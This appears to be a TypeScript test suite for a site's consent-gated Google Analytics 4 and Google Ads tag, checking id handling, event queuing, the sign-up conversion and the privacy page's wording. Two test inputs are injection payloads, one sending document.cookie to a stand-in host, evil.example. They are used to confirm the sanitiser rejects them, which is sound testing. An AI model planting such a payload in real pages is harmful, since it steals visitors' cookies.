// Google tag (GA4 + Google Ads): nothing without Accept, gtag.js once, one config per
// distinct ID, no repeat when the old variable holds a "G-" ID, and two GA4 events
// (sign_up, begin_checkout) with no personal data.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync, readdirSync } from 'node:fs'
import path from 'node:path'
import vm from 'node:vm'
import { fileURLToPath } from 'node:url'

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const read = (rel: string) => readFileSync(path.join(ROOT, rel), 'utf8')

const tag = await import('@/lib/google-tag.ts')

const GA4 = 'G-QYDSQ8W6TX'
const ADS = 'AW-18335043737'

/** Run the bootstrap script in a fresh fake browser; returns the window and the dataLayer as plain arrays. */
function boot(configIds: string[], win: Record<string, unknown> = {}) {
  const ctx: Record<string, unknown> = win
  ctx.window = ctx
  vm.runInNewContext(tag.googleTagBootstrapScript(configIds), ctx)
  const layer = () => Array.from(ctx.dataLayer as ArrayLike<ArrayLike<unknown>>).map(a => Array.from(a)) // vm arrays are another realm: copy to host arrays
  return { ctx, layer }
}

test('no Accept, no tag: nothing loads and nothing is configured', () => {
  for (const consent of [null, 'declined'] as const) {
    const plan = tag.googleTagPlan({ consent, ga4Env: GA4, legacyEnv: ADS })
    assert.equal(plan.loaderId, null)
    assert.deepEqual(plan.configIds, [])
  }
})

test('Accept: one loader and two configs (GA4 and Ads)', () => {
  const plan = tag.googleTagPlan({ consent: 'accepted', ga4Env: '', legacyEnv: ADS })
  assert.equal(plan.loaderId, GA4)
  assert.deepEqual(plan.configIds, [GA4, ADS])
  assert.equal(tag.googleTagLoaderUrl(plan.loaderId!), `https://www.googletagmanager.com/gtag/js?id=${GA4}`)

  const { layer } = boot(plan.configIds)
  const commands = layer()
  assert.equal(commands.filter(c => c[0] === 'js').length, 1)
  assert.deepEqual(commands.filter(c => c[0] === 'config').map(c => c[1]), [GA4, ADS])
})

test('GA4 id comes from NEXT_PUBLIC_GA4_MEASUREMENT_ID, and falls back to the built-in id when empty or malformed', () => {
  assert.equal(tag.googleTagPlan({ consent: 'accepted', ga4Env: 'G-ABCD1234', legacyEnv: ADS }).configIds[0], 'G-ABCD1234')
  for (const bad of [undefined, null, '', '   ', 'UA-123-1', 'G-', "G-AB');alert(1);//"]) {
    assert.equal(tag.googleTagPlan({ consent: 'accepted', ga4Env: bad, legacyEnv: ADS }).configIds[0], tag.DEFAULT_GA4_ID)
  }
  assert.equal(tag.DEFAULT_GA4_ID, GA4)
})

test('Ads id only: still one loader, GA4 default plus Ads, Ads behaviour unchanged', () => {
  const plan = tag.googleTagPlan({ consent: 'accepted', legacyEnv: `﻿${ADS}\n` })
  assert.deepEqual(plan.configIds, [GA4, ADS])
})

test('old variable holding the same G- id is not loaded twice; a different G- id is kept once', () => {
  // (the Tutafy Ads id is always configured too, once: see the next test)
  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: GA4 }).configIds, [GA4, ADS])
  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: '', legacyEnv: GA4 }).configIds, [GA4, ADS])
  const { layer } = boot(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: GA4 }).configIds)
  assert.deepEqual(layer().filter(c => c[0] === 'config').map(c => c[1]), [GA4, ADS], 'GA4 configured once')
  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: 'G-OTHER12' }).configIds, [GA4, 'G-OTHER12', ADS])
})

test('the Ads id is configured exactly once whatever the old variable holds, so the conversion has its destination', () => {
  assert.equal(tag.ADS_ID, ADS)
  for (const legacyEnv of [undefined, '', ADS, `${ADS}\n`, 'AW-OTHER123']) {
    const ids = tag.googleTagPlan({ consent: 'accepted', legacyEnv }).configIds
    assert.equal(ids.filter(id => id === ADS).length, 1, String(legacyEnv))
    assert.equal(new Set(ids).size, ids.length, 'no id twice')
  }
  assert.equal(tag.googleTagPlan({ consent: 'declined' }).configIds.length, 0, 'still nothing without Accept')
})

test('an id that is not a tag id never reaches the page script', () => {
  const evil = `AW-1');fetch('//evil.example/'+document.cookie);//`
  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', legacyEnv: evil }).configIds, [GA4, ADS])
  assert.ok(!tag.googleTagBootstrapScript([evil, ADS]).includes('evil'))
})

test('events: not sent without Accept (no queue entry, no dataLayer entry)', () => {
  for (const consent of [null, 'declined'] as const) {
    const win: Record<string, unknown> = {}
    tag.sendGaEvent(win, consent, 'sign_up')
    tag.sendGaEvent(win, consent, 'begin_checkout', tag.beginCheckoutParams('pro'))
    assert.equal(win.dataLayer, undefined)
    assert.equal(win.__tutafyGtagPending, undefined)
  }
})

test('events asked for before the tag started are sent after config, in order', () => {
  const win: Record<string, unknown> = {}
  tag.sendGaEvent(win, 'accepted', 'sign_up')
  tag.sendGaEvent(win, 'accepted', 'begin_checkout', tag.beginCheckoutParams('academy'))
  assert.equal(win.dataLayer, undefined, 'nothing is pushed before gtag has been set up')

  const { layer, ctx } = boot([GA4, ADS], win)
  const names = layer().map(c => c[0] === 'event' ? `event:${c[1]}` : `${c[0]}:${Object.prototype.toString.call(c[1]) === "[object Date]" ? "date" : c[1]}`)
  assert.deepEqual(names, ['js:date', `config:${GA4}`, `config:${ADS}`, 'event:sign_up', 'event:begin_checkout'])
  assert.equal(Array.from(ctx.__tutafyGtagPending as ArrayLike<unknown>).length, 0)

  // once the tag is up, later events go straight through
  tag.sendGaEvent(ctx, 'accepted', 'begin_checkout', tag.beginCheckoutParams('pro'))
  assert.equal(layer().at(-1)![1], 'begin_checkout')
})

test('events carry no personal data: sign_up has no parameters, begin_checkout only the plan', () => {
  const win: Record<string, unknown> = {}
  tag.sendGaEvent(win, 'accepted', 'sign_up')
  tag.sendGaEvent(win, 'accepted', 'begin_checkout', tag.beginCheckoutParams('pro'))
  const [signUp, checkout] = win.__tutafyGtagPending as unknown[][]
  assert.deepEqual(signUp, ['event', 'sign_up'])
  assert.deepEqual(checkout, ['event', 'begin_checkout', { items: [{ item_id: 'pro', item_name: 'Tutafy Pro' }] }])
  const text = JSON.stringify(win.__tutafyGtagPending)
  assert.ok(!/@|email|name"|user_id|phone/i.test(text.replace(/item_name/g, '')))
})

// --- the components use these rules (page .tsx files cannot be imported by the test runner) ---

test('Analytics.tsx: renders only after Accept, loads gtag.js through the plan exactly once', () => {
  const src = read('src/components/Analytics.tsx')
  assert.ok(src.indexOf('if (!ok) return null') < src.indexOf('googleTagPlan('), 'plan is built only after the consent gate')
  assert.equal((src.match(/googleTagLoaderUrl\(/g) ?? []).length, 1, 'one loader Script')
  assert.ok(!/gtag\/js/.test(src), 'no second hand-written gtag.js URL')
  assert.equal((src.match(/googleTagBootstrapScript\(/g) ?? []).length, 1, 'one bootstrap script')
  assert.ok(!/gtag\('config'/.test(src), 'config calls come from the plan only')
  assert.ok(src.includes('process.env.NEXT_PUBLIC_GA4_MEASUREMENT_ID'))
  assert.ok(src.includes('process.env.NEXT_PUBLIC_GA_MEASUREMENT_ID'))
})

// ---- the Google Ads sign-up conversion (T-0624) ----------------------------------------------
// gtag.js reads only the `arguments` object that gtag() pushes; an array pushed by hand
// (the old onboarding line) is ignored, so the conversion was probably never recorded.

const LABEL = 'AW-18335043737/SHlACJ_tptgcEJmh6qZE'
const isArguments = (x: unknown) => Object.prototype.toString.call(x) === '[object Arguments]'

/** The dataLayer of a window as raw entries (not copied), so their real kind can be checked. */
const rawLayer = (ctx: Record<string, unknown>) => Array.from(ctx.dataLayer as ArrayLike<unknown>)
const conversions = (ctx: Record<string, unknown>) =>
  rawLayer(ctx).filter(e => isArguments(e) && (e as ArrayLike<unknown>)[0] === 'event' && (e as ArrayLike<unknown>)[1] === 'conversion')

test('the conversion label is the one the owner set up, unchanged', () => {
  assert.equal(tag.ADS_SIGNUP_CONVERSION, LABEL)
})

test('conversion: not sent, not queued and not pushed without Accept', () => {
  for (const consent of [null, 'declined'] as const) {
    const win: Record<string, unknown> = {}
    tag.sendAdsSignupConversion(win, consent)
    assert.equal(win.dataLayer, undefined)
    assert.equal(win.__tutafyGtagPending, undefined)
    // even when gtag is already running, a visitor who did not accept gets nothing
    const { ctx } = boot([GA4, ADS])
    const before = rawLayer(ctx).length
    tag.sendAdsSignupConversion(ctx, consent)
    assert.equal(rawLayer(ctx).length, before)
    assert.equal(conversions(ctx).length, 0)
  }
})

test('conversion after Accept, before gtag started: waits, then dataLayer holds exactly one arguments entry for it, after config', () => {
  const win: Record<string, unknown> = {}
  tag.sendAdsSignupConversion(win, 'accepted')
  assert.equal(win.dataLayer, undefined, 'nothing is pushed before gtag has been set up')

  const { ctx, layer } = boot([GA4, ADS], win)
  const found = conversions(ctx)
  assert.equal(found.length, 1)
  assert.deepEqual(Array.from(found[0] as ArrayLike<unknown>).slice(0, 2), ['event', 'conversion'])
  assert.deepEqual({ ...(Array.from(found[0] as ArrayLike<unknown>)[2] as object) }, { send_to: LABEL })
  assert.equal(Array.from(found[0] as ArrayLike<unknown>).length, 3)
  const names = layer().map(c => c[0] === 'event' ? `event:${c[1]}` : String(c[0]))
  assert.deepEqual(names, ['js', 'config', 'config', 'event:conversion'], 'config for the Ads id comes first')
  // every entry gtag.js will read is an arguments object; no entry is a plain array
  for (const e of rawLayer(ctx)) assert.ok(isArguments(e), 'a dataLayer entry is not an arguments object')
})

test('conversion after Accept, gtag already running: goes straight in as one arguments entry', () => {
  const { ctx } = boot([GA4, ADS])
  tag.sendAdsSignupConversion(ctx, 'accepted')
  assert.equal(conversions(ctx).length, 1)
  for (const e of rawLayer(ctx)) assert.ok(isArguments(e))
})

test('the conversion carries the label only: no personal data, no other parameter', () => {
  const win: Record<string, unknown> = {}
  tag.sendAdsSignupConversion(win, 'accepted')
  assert.deepEqual(win.__tutafyGtagPending, [['event', 'conversion', { send_to: LABEL }]])
  assert.ok(!/@|email|name|user_id|phone/i.test(JSON.stringify(win.__tutafyGtagPending)))
})

test('the check itself tells the old array shape from a real gtag call (a self-check)', () => {
  const old: Record<string, unknown> = { window: undefined }
  old.window = old
  vm.runInNewContext(`dataLayer=[];dataLayer.push(['event','conversion',{send_to:'${LABEL}'}])`, old)
  assert.equal(conversions(old).length, 0, 'the array pushed by hand is not counted as a conversion')
  assert.ok(!isArguments(rawLayer(old)[0]))
})

test('onboarding calls the helper once, inside the sign-up branch, and never touches dataLayer itself', () => {
  const src = read('src/app/onboarding/page.tsx')
  const code = src.replace(/^\s*\/\/.*$/gm, '')
  assert.ok(!/dataLayer/.test(code), 'no hand-written dataLayer push')
  assert.ok(!/AW-/.test(code), 'the id and label live in google-tag.ts only')
  assert.equal((code.match(/sendAdsSignupConversion\(/g) ?? []).length, 1, 'exactly one call')
  assert.ok(/import \{[^}]*sendAdsSignupConversion[^}]*\} from '@\/lib\/google-tag'/.test(code))
  assert.ok(code.includes(`sendAdsSignupConversion(window, getConsent())`))
  assert.ok(code.includes(`sendGaEvent(window, getConsent(), 'sign_up')`))
  const branch = code.slice(code.indexOf(`params.get('signup') === '1'`))
  assert.ok(branch.indexOf('sendAdsSignupConversion(') > 0 && branch.indexOf('sendAdsSignupConversion(') < branch.indexOf('replaceState'), 'sent before the address is cleaned, once per sign-up')
  assert.equal((read('src/lib/google-tag.ts').match(/SHlACJ_tptgcEJmh6qZE/g) ?? []).length, 1, 'the label is written once')
  assert.ok(!/SHlACJ_tptgcEJmh6qZE|AW-18335043737/.test(read('src/components/Analytics.tsx')))
})

test('begin_checkout is sent from the one function every Go Pro button calls, gated by consent', () => {
  const src = read('src/lib/track-client.ts')
  assert.ok(src.includes(`sendGaEvent(window, getConsent(), 'begin_checkout', beginCheckoutParams(plan))`))
  for (const f of ['src/components/plan/TrackedCheckoutLink.tsx', 'src/components/plan/LockedFeature.tsx']) {
    assert.ok(read(f).includes('trackCheckoutClick('), f)
  }
})

test('Privacy page names Google Analytics, the two events and what Decline does', () => {
  const src = read('src/app/privacy/page.tsx')
  assert.ok(src.includes('Google Analytics 4 and Google Ads'))
  assert.ok(/signs up for an account or clicks a Go Pro button/.test(src))
  assert.ok(/If you decline, no Google tag is loaded and nothing is sent to Google/.test(src))
})

// The Reviewer's rule (privacy-scope-matches-mount): the scope the Privacy page claims must be the scope
// the tag really has. <Analytics /> is mounted in the ROOT layout, so after Accept the Google tag (and the
// Meta Pixel) load on every page, the signed-in app included; sign_up is sent from /onboarding and
// begin_checkout from the Go Pro buttons, all inside the app.
test('Privacy page states the real scope of the Google tag: tutafy.com including the app, not "public marketing pages"', () => {
  const privacy = read('src/app/privacy/page.tsx')
  const cookies = privacy.slice(privacy.indexOf('<Section title="Cookies & analytics">'), privacy.indexOf('</Section>', privacy.indexOf('<Section title="Cookies & analytics">')))
  assert.ok(cookies.length > 200, 'the Cookies & analytics section was not found')
  assert.ok(/On tutafy\.com, <b>including the app after you sign in<\/b>/.test(cookies), 'the scope sentence is missing')
  assert.ok(/which pages they view \(in the app too, once you are signed in\)/.test(cookies), 'page views in the app are not named')
  assert.ok(!/public marketing pages/i.test(cookies), 'a "public marketing pages" scope is no longer true')

  // what the sentence is checked against: where the component is mounted and where the events are sent
  assert.ok(/<Analytics \/>/.test(read('src/app/layout.tsx')), '<Analytics /> is expected in the root layout; if it moves, rewrite the scope sentence')
  // no other layout (the app's, admin's, any route group's) mounts it or hides it behind a narrower scope
  const layouts = (readdirSync(path.join(ROOT, 'src/app'), { recursive: true }) as string[])
    .map(p => p.replace(/\\/g, '/'))
    .filter(p => /(^|\/)layout\.tsx$/.test(p) && p !== 'layout.tsx')
  assert.ok(layouts.length >= 2, 'expected the dashboard and admin layouts')
  for (const rel of layouts) assert.ok(!/<Analytics\b/.test(read(`src/app/${rel}`)), `src/app/${rel} must not mount its own Analytics`)
  assert.ok(read('src/app/onboarding/page.tsx').includes(`sendGaEvent(window, getConsent(), 'sign_up')`), 'sign_up is sent from the app (onboarding)')
  assert.ok(read('src/lib/track-client.ts').includes(`sendGaEvent(window, getConsent(), 'begin_checkout'`), 'begin_checkout is sent from the Go Pro buttons')
})
